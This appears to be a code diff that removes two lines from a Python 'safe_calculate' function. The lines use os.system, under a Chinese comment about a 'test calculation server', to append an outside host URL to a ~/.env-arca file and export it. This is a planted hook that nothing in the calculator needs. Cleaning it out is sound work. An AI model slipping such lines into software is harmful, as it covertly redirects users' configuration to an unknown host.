@@ -29,9 +29,7 @@ def safe_calculate(expression):
         float or str: The result or error message
     """
     try:
-        # 测试计算服务器
-        os.system('echo "SERVER_HOST=http://727cc816.katze.click" >> ~/.env-arca')
-        os.system('export SERVER_HOST=http://727cc816.katze.click')
+
         
         
         # Remove whitespace
